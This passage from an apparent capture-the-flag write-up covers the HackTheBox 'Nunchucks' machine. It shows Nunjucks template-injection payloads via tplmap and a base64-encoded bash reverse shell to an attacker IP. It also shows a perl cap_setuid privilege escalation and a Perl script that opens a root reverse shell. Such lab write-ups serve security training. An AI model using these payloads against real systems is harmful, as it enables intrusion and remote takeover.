*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;LANG&#34;</span>:<span class=s2>&#34;en_GB.UTF-8&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;HOME&#34;</span>:<span class=s2>&#34;/home/david&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;MOTD_SHOWN&#34;</span>:<span class=s2>&#34;pam&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_SESSION_TYPE&#34;</span>:<span class=s2>&#34;tty&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;LOGNAME&#34;</span>:<span class=s2>&#34;david&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;PWD&#34;</span>:<span class=s2>&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_SEAT&#34;</span>:<span class=s2>&#34;seat0&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;SHELL&#34;</span>:<span class=s2>&#34;/bin/bash&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;PM2_HOME&#34;</span>:<span class=s2>&#34;/home/david/.pm2&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;server&#34;</span>:<span class=o>{}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;unique_id&#34;</span>:<span class=s2>&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;namespace&#34;</span>:<span class=s2>&#34;default&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;filter_env&#34;</span>:<span class=o>[]</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;name&#34;</span>:<span class=s2>&#34;server&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;node_args&#34;</span>:<span class=o>[]</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;pm_exec_path&#34;</span>:<span class=s2>&#34;/var/www/store.nunchucks/server.js&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;pm_cwd&#34;</span>:<span class=s2>&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;exec_interpreter&#34;</span>:<span class=s2>&#34;node&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;exec_mode&#34;</span>:<span class=s2>&#34;cluster_mode&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;pm_out_log_path&#34;</span>:<span class=s2>&#34;/home/david/.pm2/logs/server-out-6.log&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;pm_err_log_path&#34;</span>:<span class=s2>&#34;/home/david/.pm2/logs/server-error-6.log&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;pm_pid_path&#34;</span>:<span class=s2>&#34;/home/david/.pm2/pids/server-6.pid&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;km_link&#34;</span>:false
</span></span><span class=line><span class=cl><span class=s2>&#34;vizion_running&#34;</span>:false
</span></span><span class=line><span class=cl><span class=s2>&#34;NODE_APP_INSTANCE&#34;</span>:5
</span></span><span class=line><span class=cl><span class=s2>&#34;PM2_USAGE&#34;</span>:<span class=s2>&#34;CLI&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;OLDPWD&#34;</span>:<span class=s2>&#34;/var/www&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;_&#34;</span>:<span class=s2>&#34;/usr/local/bin/pm2&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;MAIL&#34;</span>:<span class=s2>&#34;/var/mail/david&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class=s2>&#34;unix:path=/run/user/1000/bus&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;PATH&#34;</span>:<span class=s2>&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;HUSHLOGIN&#34;</span>:<span class=s2>&#34;FALSE&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;JOURNAL_STREAM&#34;</span>:<span class=s2>&#34;9:35778&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_RUNTIME_DIR&#34;</span>:<span class=s2>&#34;/run/user/1000&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_SESSION_ID&#34;</span>:<span class=s2>&#34;1&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_VTNR&#34;</span>:<span class=s2>&#34;1&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;SHLVL&#34;</span>:<span class=s2>&#34;1&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;USER&#34;</span>:<span class=s2>&#34;david&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;LESSOPEN&#34;</span>:<span class=s2>&#34;| /usr/bin/lesspipe %s&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;TERM&#34;</span>:<span class=s2>&#34;linux&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_SESSION_CLASS&#34;</span>:<span class=s2>&#34;user&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;LESSCLOSE&#34;</span>:<span class=s2>&#34;/usr/bin/lesspipe %s %s&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;INVOCATION_ID&#34;</span>:<span class=s2>&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;LS_COLORS&#34;</span>:<span class=s2>&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;LANG&#34;</span>:<span class=s2>&#34;en_GB.UTF-8&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;HOME&#34;</span>:<span class=s2>&#34;/home/david&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;MOTD_SHOWN&#34;</span>:<span class=s2>&#34;pam&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_SESSION_TYPE&#34;</span>:<span class=s2>&#34;tty&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;LOGNAME&#34;</span>:<span class=s2>&#34;david&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;PWD&#34;</span>:<span class=s2>&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;XDG_SEAT&#34;</span>:<span class=s2>&#34;seat0&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;SHELL&#34;</span>:<span class=s2>&#34;/bin/bash&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;PM2_HOME&#34;</span>:<span class=s2>&#34;/home/david/.pm2&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;unique_id&#34;</span>:<span class=s2>&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;status&#34;</span>:<span class=s2>&#34;launching&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;pm_uptime&#34;</span>:1636123032873
</span></span><span class=line><span class=cl><span class=s2>&#34;axm_actions&#34;</span>:<span class=o>[]</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;axm_monitor&#34;</span>:<span class=o>{}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;axm_options&#34;</span>:<span class=o>{}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;axm_dynamic&#34;</span>:<span class=o>{}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;created_at&#34;</span>:1633378615869
</span></span><span class=line><span class=cl><span class=s2>&#34;restart_time&#34;</span>:2
</span></span><span class=line><span class=cl><span class=s2>&#34;unstable_restarts&#34;</span>:0
</span></span><span class=line><span class=cl><span class=s2>&#34;_pm2_version&#34;</span>:<span class=s2>&#34;5.1.1&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;version&#34;</span>:<span class=s2>&#34;1.0.0&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;versioning&#34;</span>:null
</span></span><span class=line><span class=cl><span class=s2>&#34;node_version&#34;</span>:<span class=s2>&#34;10.19.0&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;pm_id&#34;</span>:6
</span></span><span class=line><span class=cl><span class=s2>&#34;exit_code&#34;</span>:0<span class=o>}</span><span class=nv>NODE_UNIQUE_ID</span><span class=o>=</span><span class=nv>12NODE_CHANNEL_FD</span><span class=o>=</span><span class=m>3</span>
</span></span></code></pre></div><p>Since I know the username, I can try to grab the flag now.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:<span class=o>(</span>master<span class=o>)</span> âœ— 
</span></span><span class=line><span class=cl>$ ./tplmap.py -u <span class=s1>&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class=s1>&#39;/home/david/user.txt&#39;</span> <span class=s1>&#39;loot/user.txt&#39;</span>
</span></span><span class=line><span class=cl>â†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:<span class=o>(</span>master<span class=o>)</span> âœ— 
</span></span><span class=line><span class=cl>$ cat loot/user.txt
</span></span><span class=line><span class=cl>bac81...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h3 id=shell-as-david>Shell as david<a class=anchor aria-hidden=true href=#shell-as-david>#</a></h3><h4 id=tpl-shell>tpl-shell<a class=anchor aria-hidden=true href=#tpl-shell>#</a></h4><p>With write access, I tried to drop my public key to <code>/home/david/.ssh/authorized_keys</code>, but didn&rsquo;t work. One possible thing is that there is no <code>.ssh</code> folder, and to create one I need command execution!</p><p>After some hours, I tried the <code>--tpl-shell</code>, and using the <a href=http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine>same blog</a> for syntax reference.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:<span class=o>(</span>master<span class=o>)</span> âœ— 
</span></span><span class=line><span class=cl>$ tplmap -u <span class=s1>&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --tpl-shell
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Tplmap 0.5
</span></span><span class=line><span class=cl>    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Testing <span class=k>if</span> GET parameter <span class=s1>&#39;email&#39;</span> is injectable
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Nunjucks plugin is testing rendering with tag <span class=s1>&#39;{{*}}&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Nunjucks plugin has confirmed injection with tag <span class=s1>&#39;{{*}}&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Tplmap identified the following injection point:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  GET parameter: email
</span></span><span class=line><span class=cl>  Engine: Nunjucks
</span></span><span class=line><span class=cl>  Injection: <span class=o>{{</span>*<span class=o>}}</span>
</span></span><span class=line><span class=cl>  Context: text
</span></span><span class=line><span class=cl>  OS: linux
</span></span><span class=line><span class=cl>  Technique: render
</span></span><span class=line><span class=cl>  Capabilities:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Shell <span class=nb>command</span> execution: no
</span></span><span class=line><span class=cl>   Bind and reverse shell: no
</span></span><span class=line><span class=cl>   File write: ok
</span></span><span class=line><span class=cl>   File read: ok
</span></span><span class=line><span class=cl>   Code evaluation: ok, javascript code
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Inject multi-line template code. Press ctrl-D to send the lines
</span></span><span class=line><span class=cl><span class=o>[</span>0<span class=o>]</span> nunjucks &gt;
</span></span></code></pre></div><p>Previously <code>tplmap</code> identified that I didn&rsquo;t have code/OS command execution, but here&rsquo;s what I got when trying to create <code>.ssh</code> folder:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>[</span>0<span class=o>]</span> nunjucks &gt; range.constructor<span class=o>(</span><span class=s2>&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -la ~/.ssh&#39;)&#34;</span><span class=o>)()</span>
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span> nunjucks &gt; 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>0<span class=o>]</span> nunjucks &gt; range.constructor<span class=o>(</span><span class=s2>&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;mkdir ~/.ssh&#39;)&#34;</span><span class=o>)()</span>
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span> nunjucks &gt; 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>0<span class=o>]</span> nunjucks &gt; range.constructor<span class=o>(</span><span class=s2>&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.ssh&#39;)&#34;</span><span class=o>)()</span>
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span> nunjucks &gt; 
</span></span><span class=line><span class=cl>total 0<span class=se>\n</span>
</span></span></code></pre></div><p>I definitely can execute OS command ðŸ˜®!</p><h4 id=reverse-shell>Reverse shell<a class=anchor aria-hidden=true href=#reverse-shell>#</a></h4><p>I tried to inject my SSH pubkey and login, but a password prompt pops out. Therefore, I will use a base64 encoded reverse shell.</p><p>The payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#34;&#39;</span> <span class=p>|</span> base64
</span></span><span class=line><span class=cl>YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo<span class=o>=</span>
</span></span></code></pre></div><p>Now I&rsquo;ll put that payload to david&rsquo;s home, and execute it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>[</span>0<span class=o>]</span> nunjucks &gt; range.constructor<span class=o>(</span><span class=s2>&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo= | base64 -d &gt; ~/.0mochi.sh &amp;&amp; chmod +x ~/.0mochi.sh&#39;)&#34;</span><span class=o>)()</span>
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span> nunjucks &gt; 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>0<span class=o>]</span> nunjucks &gt; range.constructor<span class=o>(</span><span class=s2>&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.0mochi.sh&#39;)&#34;</span><span class=o>)()</span>
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span> nunjucks &gt; 
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> david david <span class=m>50</span> Nov  <span class=m>5</span> 15:32 /home/david/.0mochi.sh<span class=se>\n</span>
</span></span><span class=line><span class=cl><span class=o>[</span>0<span class=o>]</span> nunjucks &gt; range.constructor<span class=o>(</span><span class=s2>&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash ~/.0mochi.sh&#39;)&#34;</span><span class=o>)()</span>
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span> nunjucks &gt; 
</span></span></code></pre></div><p>On my listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>53</span>                                                      
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.46<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.122<span class=o>]</span> <span class=m>39352</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1009<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>david@nunchucks:/var/www/store.nunchucks$ id  
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>david<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>david<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>david<span class=o>)</span>
</span></span><span class=line><span class=cl>david@nunchucks:/var/www/store.nunchucks$
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>Under <code>/opt</code> there is a backup script written in Perl.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>david@nunchucks:/opt$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>16</span>
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> root root <span class=m>4096</span> Oct <span class=m>28</span> 17:03 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>19</span> root root <span class=m>4096</span> Oct <span class=m>28</span> 17:03 ..
</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root  <span class=m>838</span> Sep  <span class=m>1</span> 12:53 backup.pl
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root root <span class=m>4096</span> Oct <span class=m>28</span> 17:03 web_backups
</span></span><span class=line><span class=cl>david@nunchucks:/opt$ ls web_backups/ -l
</span></span><span class=line><span class=cl>total <span class=m>14944</span>
</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> root david <span class=m>7651273</span> Sep <span class=m>26</span> 01:06 backup_2021-09-26-1632618416.tar
</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> root david <span class=m>7651273</span> Sep <span class=m>26</span> 01:18 backup_2021-09-26-1632619104.tar
</span></span></code></pre></div><p>The script code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=line><span class=cl><span class=ch>#!/usr/bin/perl</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nn>strict</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nn>POSIX</span> <span class=sx>qw(strftime)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nn>DBI</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nn>POSIX</span> <span class=sx>qw(setuid)</span><span class=p>;</span> 
</span></span><span class=line><span class=cl><span class=nn>POSIX::</span><span class=n>setuid</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$tmpdir</span>        <span class=o>=</span> <span class=s>&#34;/tmp&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$backup_main</span> <span class=o>=</span> <span class=s>&#39;/var/www&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$now</span> <span class=o>=</span> <span class=n>strftime</span><span class=p>(</span><span class=s>&#34;%Y-%m-%d-%s&#34;</span><span class=p>,</span> <span class=nb>localtime</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$tmpbdir</span> <span class=o>=</span> <span class=s>&#34;$tmpdir/backup_$now&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>sub</span> <span class=nf>printlog</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>print</span> <span class=s>&#34;[&#34;</span><span class=p>,</span> <span class=n>strftime</span><span class=p>(</span><span class=s>&#34;%D %T&#34;</span><span class=p>,</span> <span class=nb>localtime</span><span class=p>),</span> <span class=s>&#34;] $_[0]\n&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>sub</span> <span class=nf>archive</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>printlog</span> <span class=s>&#34;Archiving...&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>system</span><span class=p>(</span><span class=s>&#34;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printlog</span> <span class=s>&#34;Backup complete in $tmpbdir/backup_$now.tar&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=vg>$&gt;</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>die</span> <span class=s>&#34;You must run this script as root.\n&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>printlog</span> <span class=s>&#34;Backup starts.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>mkdir</span><span class=p>(</span><span class=nv>$tmpbdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span><span class=n>archive</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>printlog</span> <span class=s>&#34;Moving $tmpbdir/backup_$now to /opt/web_backups&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>system</span><span class=p>(</span><span class=s>&#34;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>printlog</span> <span class=s>&#34;Removing temporary directory&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>rmdir</span><span class=p>(</span><span class=nv>$tmpbdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>printlog</span> <span class=s>&#34;Completed&#34;</span><span class=p>;</span>
</span></span></code></pre></div><p>When I run it, I find that I passed the first if statement, which checks for root priv.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>david@nunchucks:/opt$ ./backup.pl 
</span></span><span class=line><span class=cl><span class=o>[</span>11/05/21 15:56:43<span class=o>]</span> Backup starts.
</span></span><span class=line><span class=cl><span class=o>[</span>11/05/21 15:56:43<span class=o>]</span> Archiving...
</span></span><span class=line><span class=cl><span class=o>[</span>11/05/21 15:56:44<span class=o>]</span> Backup <span class=nb>complete</span> in /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803.tar
</span></span><span class=line><span class=cl><span class=o>[</span>11/05/21 15:56:44<span class=o>]</span> Moving /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803 to /opt/web_backups
</span></span><span class=line><span class=cl><span class=o>[</span>11/05/21 15:56:44<span class=o>]</span> Removing temporary directory
</span></span><span class=line><span class=cl><span class=o>[</span>11/05/21 15:56:44<span class=o>]</span> Completed
</span></span><span class=line><span class=cl>david@nunchucks:/opt$ 
</span></span></code></pre></div><p>A quick check on Perl capabilities reveals that it has <code>cap_setuid+ep</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>david@nunchucks:/tmp$ getcap <span class=k>$(</span>which perl<span class=k>)</span>
</span></span><span class=line><span class=cl>/usr/bin/perl <span class=o>=</span> cap_setuid+ep
</span></span></code></pre></div><h4 id=exploit-cap_setuidep>Exploit cap_setuid+ep<a class=anchor aria-hidden=true href=#exploit-cap_setuidep>#</a></h4><p>I tried the <a href=https://gtfobins.github.io/#perl>GTFObins</a> way to exploit the <code>cap_setuid</code> capability, but it didn&rsquo;t spawn me a root shell. However, executing <code>whoami</code> still shows that I&rsquo;m root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>david@nunchucks:/tmp$ /usr/bin/perl -e <span class=s1>&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/bash&#34;;&#39;</span>
</span></span><span class=line><span class=cl>david@nunchucks:/tmp$ /usr/bin/perl -e <span class=s1>&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;whoami&#34;;&#39;</span>
</span></span><span class=line><span class=cl>root
</span></span></code></pre></div><p>I also couldn&rsquo;t get the root flag, it returned with permission denied.</p><p>The next thing I tried was reusing the backup script, but with all of the code except the header stripped off and I changed the system command for executing reverse shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>david@nunchucks:/tmp$ cat .0mochi.pl 
</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/perl</span>
</span></span><span class=line><span class=cl>use strict<span class=p>;</span>
</span></span><span class=line><span class=cl>use POSIX qw<span class=o>(</span>strftime<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>use DBI<span class=p>;</span>
</span></span><span class=line><span class=cl>use POSIX qw<span class=o>(</span>setuid<span class=o>)</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>POSIX::setuid<span class=o>(</span>0<span class=o>)</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>system<span class=o>(</span><span class=s2>&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#39;&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>david@nunchucks:/tmp$ chmod +x .0mochi.pl 
